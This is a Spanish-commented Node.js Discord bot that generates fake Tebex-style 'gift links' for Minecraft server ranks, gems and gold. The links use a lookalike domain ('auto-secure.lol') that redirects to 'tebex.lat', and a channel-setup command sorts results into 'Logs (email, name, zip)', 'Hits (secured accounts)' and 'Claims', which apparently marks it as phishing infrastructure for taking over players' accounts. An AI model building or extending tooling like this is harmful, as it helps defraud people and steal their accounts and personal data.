// Para guardar el canal configurado
let configuredChannelId = null;
let configuredChannelType = null;
// Discord bot for Tebex-style product links
// Requires: discord.js v14+, Node.js 16+
// 1. npm install discord.js dotenv
// 2. Set your bot token in a .env file as DISCORD_TOKEN=your_token_here

const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, InteractionType } = require('discord.js');
require('dotenv').config();

// Dominios y rutas configurables
const PRODUCT_DOMAIN = process.env.PRODUCT_DOMAIN || "https://auto-secure.lol"; // Dominio que se muestra en los links
const PRODUCT_PATH = process.env.PRODUCT_PATH || "/redeem/"; // Path configurable después del dominio
const PRODUCT_URL_BASE = PRODUCT_DOMAIN + PRODUCT_PATH; // Ejemplo: https://midominio.local/checkout?gift=
const REDIRECT_URL_BASE = process.env.REDIRECT_URL_BASE || "https://tebex.lat/checkout?gift="; // Dominio real al que se redirige

// Función para generar un código aleatorio
function generateCode(length = 16) {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// Función para formatear el nombre del producto
function formatProductName(name) {
  return name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
}
const PRODUCTS = [
  { id: 1, name: "16,400 SkyBlock Gems", price: "99.99" },
  { id: 2, name: "3,600 SkyBlock Gems", price: "24.99" },
  { id: 3, name: "11,000 Gold", price: "100.00" },
  { id: 4, name: "VIP Rank", price: "6.99" },
  { id: 5, name: "VIP+ Rank", price: "14.99" },
  { id: 6, name: "MVP Rank", price: "29.99" },
  { id: 7, name: "MVP+ Rank", price: "44.99" },
  { id: 8, name: "MVP++ Rank", price: "7.99" },
  { id: 9, name: "1,000 Gold", price: "9.99" },
  { id: 10, name: "2,500 Gold", price: "25.00" },
  { id: 11, name: "5,000 Gold", price: "50.00" },
  { id: 12, name: "11,000 Gold", price: "100.00" },
  { id: 13, name: "675 SkyBlock Gems", price: "4.99" },
  { id: 14, name: "1,390 SkyBlock Gems", price: "9.99" },
  { id: 15, name: "3,600 SkyBlock Gems", price: "24.99" },
  { id: 16, name: "7,200 SkyBlock Gems", price: "49.99" }
];

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
  // Autocomplete handler
  if (interaction.type === InteractionType.ApplicationCommandAutocomplete) {
    const focused = interaction.options.getFocused();
    const filtered = PRODUCTS.filter(p => p.name.toLowerCase().includes(focused.toLowerCase())).slice(0, 25);
    await interaction.respond(filtered.map(p => ({ name: p.name, value: p.id.toString() })));
    return;
  }
  // Command handler
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName === 'create') {
    const sub = interaction.options.getSubcommand();
    if (sub === 'link') {
      const productId = interaction.options.getString('product');
      if (!productId) {
        // Si no se seleccionó producto, mostrar todos los productos
        // Enviar un embed por cada producto
          const embeds = PRODUCTS.map(p => ({
            type: 'rich',
            title: '📋 Gift Link Created',
            color: 5793266,
            footer: { text: '⚡ ILJ Links - Soon 2.0' },
            fields: [
              { name: 'Product', value: p.name, inline: true },
              { name: 'Price', value: `$${p.price}`, inline: true },
              { name: 'Link', value: `${PRODUCT_URL_BASE}${formatProductName(p.name)}-${generateCode(16)}`, inline: false },
                        { name: 'Creado por', value: `<@${interaction.user.id}>`, inline: false }
            ]
          }));
        if (configuredChannelId && configuredChannelType === 'logs') {
          const channel = await interaction.guild.channels.fetch(configuredChannelId).catch(() => null);
          if (channel) {
            for (const embed of embeds) {
              await channel.send({ embeds: [embed] });
            }
            await interaction.reply({ content: `Links enviados a <#${configuredChannelId}>`, ephemeral: true });
          } else {
            await interaction.reply({ content: 'No se pudo encontrar el canal configurado.', ephemeral: true });
          }
        } else {
          for (const embed of embeds) {
            await interaction.user.send({ embeds: [embed] }).catch(() => {});
          }
          await interaction.reply({ content: 'Links enviados por DM.', ephemeral: true });
        }
        return;
      }
      const product = PRODUCTS.find(p => p.id.toString() === productId);
      if (!product) {
        await interaction.reply({ content: 'Producto no encontrado.', ephemeral: true });
        return;
      }
      const productUrl = `${PRODUCT_URL_BASE}${formatProductName(product.name)}-${generateCode(16)}`;
      // Crear embed personalizado para el producto
        const embed = {
          type: 'rich',
          title: '📋 Gift Link Created',
          color: 5793266,
          footer: { text: '⚡ ILJ Links - Soon 2.0' },
          fields: [
            { name: 'Product', value: product.name, inline: true },
            { name: 'Price', value: `$${product.price}`, inline: true },
            { name: 'Link', value: productUrl, inline: false },
                    { name: 'Creado por', value: `<@${interaction.user.id}>`, inline: false }
          ]
        };
      if (configuredChannelId && configuredChannelType === 'logs') {
        const channel = await interaction.guild.channels.fetch(configuredChannelId).catch(() => null);
        if (channel) {
          await channel.send({ embeds: [embed] });
          await interaction.reply({ content: `Link enviado a <#${configuredChannelId}>`, ephemeral: true });
        } else {
          await interaction.reply({ content: `No se pudo encontrar el canal configurado.`, ephemeral: true });
        }
      } else {
        await interaction.reply({ embeds: [embed], ephemeral: true });
      }
    }
  }
    if (interaction.commandName === 'setchannel') {
      const type = interaction.options.getString('type');
      const channel = interaction.options.getChannel('channel');
      if (!type || !channel) {
        await interaction.reply({ content: 'Debes seleccionar un tipo y un canal.', ephemeral: true });
        return;
      }
      configuredChannelId = channel.id;
      configuredChannelType = type;
      await interaction.reply({ content: `Canal configurado: <#${channel.id}>\nTipo: ${type}`, ephemeral: true });
      return;
    }
});

// Register slash command /create link with autocomplete
const commands = [
  new SlashCommandBuilder()
    .setName('create')
    .setDescription('Crear links de productos')
    .addSubcommand(sub =>
      sub.setName('link')
        .setDescription('Ver links de productos disponibles')
        .addStringOption(opt =>
          opt.setName('product')
            .setDescription('Product name')
            .setRequired(false)
            .setAutocomplete(true)
        )
    )
    .toJSON(),
  new SlashCommandBuilder()
    .setName('setchannel')
    .setDescription('Configura el canal para enviar los links')
    .addStringOption(opt =>
      opt.setName('type')
        .setDescription('Channel type')
        .setRequired(true)
        .addChoices(
          { name: 'Logs (email, name, zip)', value: 'logs' },
          { name: 'Hits (secured accounts)', value: 'hits' },
          { name: 'Claims (sub-user claims)', value: 'claims' }
        )
    )
    .addChannelOption(opt =>
      opt.setName('channel')
        .setDescription('Channel')
        .setRequired(true)
    )
    .toJSON()
];


// Debug: mostrar token y client id (solo primeros y últimos caracteres por seguridad)
console.log('DISCORD_TOKEN:', process.env.DISCORD_TOKEN ? process.env.DISCORD_TOKEN.slice(0, 5) + '...' + process.env.DISCORD_TOKEN.slice(-5) : 'undefined');
console.log('CLIENT_ID:', process.env.CLIENT_ID || 'undefined');

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

(async () => {
  try {
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log('Slash command registered.');
  } catch (error) {
    console.error(error);
  }
})();

client.login(process.env.DISCORD_TOKEN);
// Fin del archivo: todas las llaves y paréntesis están cerrados correctamente.
